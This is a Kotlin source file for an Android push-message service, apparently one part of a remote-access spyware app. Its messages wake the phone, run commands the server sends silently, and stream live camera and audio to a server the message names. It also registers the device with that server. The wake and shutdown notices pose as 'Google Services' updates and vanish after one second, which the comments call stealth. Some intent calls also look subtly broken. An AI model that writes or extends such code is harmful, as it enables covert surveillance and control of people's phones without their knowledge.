package com.remote.system

import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.PowerManager
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import kotlinx.coroutines.*

/**
 * ZombieMessagingService - Ghost Resurrection System
 * 
 * Handles Firebase Cloud Messaging (FCM) for the Ghost Resurrection System.
 * This service can wake up dormant devices and execute commands silently.
 * 
 * Features:
 * - Device resurrection from FCM messages
 * - Smart timeout with auto-shutdown after 8 minutes
 * - Stealth 1-second wake/shutdown notifications (Option A)
 * - Silent command execution without persistent notifications
 * 
 * Message Types:
 * - "wake_zombie": Wake up device and start SmartGhostService
 * - "shutdown_zombie": Force immediate shutdown
 * - "command": Execute command silently (requires active session)
 */
class ZombieMessagingService : FirebaseMessagingService() {
    
    companion object {
        private const val TAG = "ZombieMessaging"
        private const val WAKE_NOTIFICATION_ID = 9999
        private const val SHUTDOWN_NOTIFICATION_ID = 9998
        private const val NOTIFICATION_CHANNEL_ID = "ghost_system"
        private const val WAKE_LOCK_TAG = "RemoteSystem:ZombieWakeLock"
        private const val NOTIFICATION_DURATION_MS = 1000L // 1 second for stealth
    }
    
    private var wakeLock: PowerManager.WakeLock? = null
    private val notificationScope = CoroutineScope(Dispatchers.Main + SupervisorJob())
    
    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        Log.d(TAG, "🧟 ZombieMessagingService created - Ghost Resurrection System active")
    }
    
    override fun onNewToken(token: String) {
        super.onNewToken(token)
        Log.d(TAG, "🔑 New FCM token generated: $token")
        
        // TODO: Send token to server for device registration
        // This will be implemented when we upgrade the server in Phase 2.4
        sendTokenToServer(token)
    }
    
    /**
     * Handle incoming FCM messages
     */
    override fun onMessageReceived(remoteMessage: RemoteMessage) {
        Log.d(TAG, "📨 FCM message received from: ${remoteMessage.from}")
        
        // Acquire wake lock to ensure processing
        acquireWakeLock()
        
        val data = remoteMessage.data
        val messageType = data["type"] ?: "unknown"
        val deviceId = data["device_id"] ?: "unknown"
        
        Log.i(TAG, "🎯 Message type: $messageType for device: $deviceId")
        
        when (messageType) {
            "wake_zombie" -> handleWakeZombie(data)
            "shutdown_zombie" -> handleShutdownZombie(data)
            "command" -> handleSilentCommand(data)
            // NEW: Live streaming commands
            "start_camera_stream" -> handleStartCameraStream(data)
            "stop_camera_stream" -> handleStopCameraStream(data)
            "start_audio_stream" -> handleStartAudioStream(data)
            "stop_audio_stream" -> handleStopAudioStream(data)
            "start_live_session" -> handleStartLiveSession(data)
            "stop_live_session" -> handleStopLiveSession(data)
            else -> {
                Log.w(TAG, "❓ Unknown message type: $messageType")
            }
        }
        
        // Release wake lock after processing
        releaseWakeLock()
    }
    
    /**
     * Handle wake_zombie command - Start SmartGhostService with 8-minute timeout
     */
    private fun handleWakeZombie(data: Map<String, String>) {
        // Show 1-second wake notification (stealth)
        showTemporaryNotification(
            WAKE_NOTIFICATION_ID,
            "System Update",
            "Google Services syncing...",
            NOTIFICATION_DURATION_MS
        )
        
        // Start SmartGhostService with 8-minute timeout
        val intent = Intent(this, SmartGhostService::class.java)
        intent.action = "START_GHOST_SESSION"
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
        
        Log.i(TAG, "👻 SmartGhostService started - Device resurrected for 8 minutes")
    }
    
    /**
     * Handle shutdown_zombie command - Force immediate shutdown
     */
    private fun handleShutdownZombie(data: Map<String, String>) {
        // Show 1-second shutdown notification (stealth)
        showTemporaryNotification(
            SHUTDOWN_NOTIFICATION_ID,
            "System Update",
            "Google Services updated",
            NOTIFICATION_DURATION_MS
        )
        
        // Stop SmartGhostService immediately
        val intent = Intent(this, SmartGhostService::class.java)
        stopService(intent)
        
        Log.i(TAG, "💀 SmartGhostService stopped - Device returned to sleep")
    }
    
    /**
     * Handle silent command execution (no notifications)
     */
    private fun handleSilentCommand(data: Map<String, String>) {
        val command = data["command"] ?: return
        
        // Check if SmartGhostService is active
        val intent = Intent(this, SmartGhostService::class.java)
        intent.action = "EXECUTE_SILENT_COMMAND"
        intent.putExtra("command", command)
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
        
        Log.i(TAG, "🤫 Silent command forwarded to SmartGhostService: $command")
    }
    
    /**
     * Handle start camera stream command
     */
    private fun handleStartCameraStream(data: Map<String, String>) {
        Log.i(TAG, "📹 Starting camera stream...")
        
        val serverUrl = data["server_url"] ?: "http://localhost:3000"
        val sessionId = data["session_id"] ?: generateSessionId()
        val cameraId = data["camera_id"] ?: "0"
        
        try {
            val intent = Intent(this, LiveCameraService::class).apply {
                action = LiveCameraService.ACTION_START_STREAM
                putExtra("server_url", serverUrl)
                putExtra("session_id", sessionId)
                putExtra("camera_id", cameraId)
            }
            
            startService(intent)
            
            showTemporaryNotification(
                WAKE_NOTIFICATION_ID + 1,
                "📹 Camera Stream",
                "Live camera streaming started",
                NOTIFICATION_DURATION_MS
            )
            
            Log.i(TAG, "✅ Camera stream service started")
            
        } catch (e: Exception) {
            Log.e(TAG, "💥 Failed to start camera stream", e)
        }
    }
    
    /**
     * Handle stop camera stream command
     */
    private fun handleStopCameraStream(data: Map<String, String>) {
        Log.i(TAG, "🛑 Stopping camera stream...")
        
        try {
            val intent = Intent(this, LiveCameraService::class).apply {
                action = LiveCameraService.ACTION_STOP_STREAM
            }
            
            startService(intent)
            stopService(Intent(this, LiveCameraService::class))
            
            showTemporaryNotification(
                WAKE_NOTIFICATION_ID + 1,
                "📹 Camera Stream",
                "Live camera streaming stopped",
                NOTIFICATION_DURATION_MS
            )
            
            Log.i(TAG, "✅ Camera stream stopped")
            
        } catch (e: Exception) {
            Log.e(TAG, "💥 Failed to stop camera stream", e)
        }
    }
    
    /**
     * Handle start audio stream command
     */
    private fun handleStartAudioStream(data: Map<String, String>) {
        Log.i(TAG, "🎤 Starting audio stream...")
        
        val serverUrl = data["server_url"] ?: "http://localhost:3000"
        val sessionId = data["session_id"] ?: generateSessionId()
        
        try {
            val intent = Intent(this, LiveAudioService::class).apply {
                action = LiveAudioService.ACTION_START_STREAM
                putExtra("server_url", serverUrl)
                putExtra("session_id", sessionId)
            }
            
            startService(intent)
            
            showTemporaryNotification(
                WAKE_NOTIFICATION_ID + 2,
                "🎤 Audio Stream",
                "Live audio streaming started",
                NOTIFICATION_DURATION_MS
            )
            
            Log.i(TAG, "✅ Audio stream service started")
            
        } catch (e: Exception) {
            Log.e(TAG, "💥 Failed to start audio stream", e)
        }
    }
    
    /**
     * Handle stop audio stream command
     */
    private fun handleStopAudioStream(data: Map<String, String>) {
        Log.i(TAG, "🛑 Stopping audio stream...")
        
        try {
            val intent = Intent(this, LiveAudioService::class).apply {
                action = LiveAudioService.ACTION_STOP_STREAM
            }
            
            startService(intent)
            stopService(Intent(this, LiveAudioService::class))
            
            showTemporaryNotification(
                WAKE_NOTIFICATION_ID + 2,
                "🎤 Audio Stream",
                "Live audio streaming stopped",
                NOTIFICATION_DURATION_MS
            )
            
            Log.i(TAG, "✅ Audio stream stopped")
            
        } catch (e: Exception) {
            Log.e(TAG, "💥 Failed to stop audio stream", e)
        }
    }
    
    /**
     * Handle start live session (camera + audio)
     */
    private fun handleStartLiveSession(data: Map<String, String>) {
        Log.i(TAG, "🎬 Starting live session (camera + audio)...")
        
        val serverUrl = data["server_url"] ?: "http://localhost:3000"
        val sessionId = data["session_id"] ?: generateSessionId()
        
        // Start both camera and audio streams
        handleStartCameraStream(mapOf(
            "server_url" to serverUrl,
            "session_id" to sessionId,
            "camera_id" to (data["camera_id"] ?: "0")
        ))
        
        handleStartAudioStream(mapOf(
            "server_url" to serverUrl,
            "session_id" to sessionId
        ))
        
        showTemporaryNotification(
            WAKE_NOTIFICATION_ID + 3,
            "🎬 Live Session",
            "Camera + Audio streaming started",
            NOTIFICATION_DURATION_MS
        )
        
        Log.i(TAG, "✅ Live session started (camera + audio)")
    }
    
    /**
     * Handle stop live session
     */
    private fun handleStopLiveSession(data: Map<String, String>) {
        Log.i(TAG, "🛑 Stopping live session...")
        
        // Stop both streams
        handleStopCameraStream(data)
        handleStopAudioStream(data)
        
        showTemporaryNotification(
            WAKE_NOTIFICATION_ID + 3,
            "🎬 Live Session", 
            "Camera + Audio streaming stopped",
            NOTIFICATION_DURATION_MS
        )
        
        Log.i(TAG, "✅ Live session stopped")
    }
    
    /**
     * Generate unique session ID
     */
    private fun generateSessionId(): String {
        return "session_${System.currentTimeMillis()}"
    }

    /**
     * Show temporary notification that disappears after specified duration
     * Used for stealth wake/shutdown notifications (Option A strategy)
     */
    private fun showTemporaryNotification(id: Int, title: String, text: String, durationMs: Long) {
        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        
        val notification = NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .setContentTitle(title)
            .setContentText(text)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setAutoCancel(false)
            .setOngoing(false)
            .setShowWhen(false)
            .build()
        
        // Show notification
        notificationManager.notify(id, notification)
        
        // Schedule automatic dismissal after duration
        notificationScope.launch {
            delay(durationMs)
            notificationManager.cancel(id)
            Log.d(TAG, "🕐 Stealth notification dismissed after ${durationMs}ms")
        }
    }
    
    /**
     * Create notification channel for Android 8.0+
     */
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                NOTIFICATION_CHANNEL_ID,
                "Google Services",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "System updates and synchronization"
                setShowBadge(false)
                enableVibration(false)
                setSound(null, null)
            }
            
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }
    
    /**
     * Acquire wake lock to keep device awake during message processing
     */
    private fun acquireWakeLock() {
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                WAKE_LOCK_TAG
            ).apply {
                acquire(30000) // 30 seconds max
            }
            Log.d(TAG, "🔒 Wake lock acquired")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to acquire wake lock", e)
        }
    }
    
    /**
     * Release wake lock
     */
    private fun releaseWakeLock() {
        try {
            wakeLock?.let {
                if (it.isHeld) {
                    it.release()
                    Log.d(TAG, "🔓 Wake lock released")
                }
            }
            wakeLock = null
        } catch (e: Exception) {
            Log.e(TAG, "Failed to release wake lock", e)
        }
    }
    
    /**
     * Send FCM token to server for device registration
     */
    private fun sendTokenToServer(token: String) {
        Log.d(TAG, "📤 Registering device with FCM token")
        
        // Get device information
        val deviceId = android.provider.Settings.Secure.getString(
            contentResolver,
            android.provider.Settings.Secure.ANDROID_ID
        )
        
        val deviceInfo = mapOf(
            "device_id" to deviceId,
            "fcm_token" to token,
            "device_model" to android.os.Build.MODEL,
            "android_version" to android.os.Build.VERSION.RELEASE,
            "app_version" to getAppVersion(),
            "registration_time" to System.currentTimeMillis().toString()
        )
        
        // Send registration to server (using existing Socket.IO or HTTP)
        try {
            val intent = Intent(this, RemoteControlService::class.java)
            intent.action = "REGISTER_FCM_TOKEN"
            intent.putExtra("device_info", deviceInfo.toString())
            startService(intent)
            
            Log.i(TAG, "✅ Device registration initiated - FCM enabled")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to register FCM token", e)
        }
    }
    
    /**
     * Get app version for registration
     */
    private fun getAppVersion(): String {
        return try {
            val packageInfo = packageManager.getPackageInfo(packageName, 0)
            packageInfo.versionName ?: "1.0"
        } catch (e: Exception) {
            "1.0"
        }
    }
    
    override fun onDestroy() {
        super.onDestroy()
        releaseWakeLock()
        notificationScope.cancel()
        Log.d(TAG, "🧟 ZombieMessagingService destroyed")
    }
}
